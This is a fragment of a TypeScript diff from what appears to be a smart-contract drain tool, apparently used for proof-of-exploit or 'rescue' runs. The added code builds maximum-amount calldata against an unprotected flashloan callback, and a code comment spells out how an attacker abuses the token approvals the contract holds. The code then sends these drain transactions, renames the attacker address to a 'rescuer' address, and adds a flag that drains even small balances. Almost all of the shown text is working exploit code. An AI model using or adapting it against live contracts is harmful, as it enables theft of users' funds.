+      const tokenAddr = tok.address.slice(2).padStart(64, "0");
+      const amount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      const innerCalldata = verifiedSelector.slice(2) + tokenAddr + amount + zero32 + zero32;
+      steps.push({
+        to: input.contractAddress,
+        data: "0x" + innerCalldata,
+        value: "0",
+        asset: `flashloan-callback with token ${tok.address.slice(0, 10)}...`,
+        strategy: `flashloan-callback:token-param`,
+      });
+    }
+  }
+
+  notes.push(
+    `flashloan-callback: built ${steps.length} call(s) to ${verifiedName ?? verifiedSelector}. ` +
+      `Exploit pattern: callback is callable by anyone — attacker invokes directly ` +
+      `to abuse token approvals held by the contract.`,
+  );
+
+  return steps;
+}
+
 // ===========================================================================
 // v2-C: WETH unwrap pre-step builder
 // ===========================================================================
@@ -2311,7 +2661,7 @@ async function executePlan(url: string, steps: DrainStep[]): Promise<PoeDrainSte
     const s = steps[i];
     const valueHex = s.value === "0" ? "0x0" : "0x" + BigInt(s.value).toString(16);
     try {
-      const sendResult = await sendFromAttacker(url, s.to, s.data, { value: valueHex });
+      const sendResult = await sendFromAddress(url, RESCUER_ADDRESS, s.to, s.data, { value: valueHex });
       const success = sendResult.receipt?.status === "0x1";
       out.push({
         index: i,
@@ -2324,7 +2674,7 @@ async function executePlan(url: string, steps: DrainStep[]): Promise<PoeDrainSte
         revertReason: success
           ? null
           : `tx ${sendResult.txHash ?? "?"} status=${sendResult.receipt?.status ?? "none"}`,
-        from: ATTACKER_ADDRESS,
+        from: RESCUER_ADDRESS,
         strategy: s.strategy,
       });
     } catch (err: any) {
@@ -2337,7 +2687,7 @@ async function executePlan(url: string, steps: DrainStep[]): Promise<PoeDrainSte
         gasUsed: null,
         success: false,
         revertReason: String(err?.message ?? err).slice(0, 240),
-        from: ATTACKER_ADDRESS,
+        from: RESCUER_ADDRESS,
         strategy: s.strategy,
       });
     }
@@ -2407,6 +2757,7 @@ function diffRescued(
   contractPost: LiveBalances,
   escrowPre: LiveBalances,
   escrowPost: LiveBalances,
+  force?: boolean,
 ): PoeAssetRescued[] {
   const out: PoeAssetRescued[] = [];
 
@@ -2421,7 +2772,7 @@ function diffRescued(
       contractPre.nativeUsdPerToken != null && Number.isFinite(human)
         ? human * contractPre.nativeUsdPerToken
         : null;
-    if (usd == null || usd >= MIN_DRAIN_USD) {
+    if (force || usd == null || usd >= MIN_DRAIN_USD) {
       out.push({
         token: null,
         amountBase: amt.toString(),
@@ -2448,7 +2799,7 @@ function diffRescued(
       const human = Number(amt) / Math.pow(10, pre.decimals);
       const usd =
         pre.usdPerToken != null && Number.isFinite(human) ? human * pre.usdPerToken : null;
-      if (usd != null && usd < MIN_DRAIN_USD) continue;
+      if (!force && usd != null && usd < MIN_DRAIN_USD) continue;
       out.push({
         token: addr,
         amountBase: amt.toString(),
@@ -2559,7 +2910,7 @@ function finalise(args: FinaliseArgs): PoeArtifact {
     trappedAssets: args.trappedAssets ?? [],
     flashloanRequirement: args.flashloanRequirement ?? null,
     escrowAddress: DEFAULT_ESCROW.toLowerCase(),
-    attackerEoa: ATTACKER_ADDRESS.toLowerCase(),
+    attackerEoa: RESCUER_ADDRESS.toLowerCase(),
     verdict: args.verdict,
     blockNumber: args.blockNumber,
     rescuedAssets: args.assets,
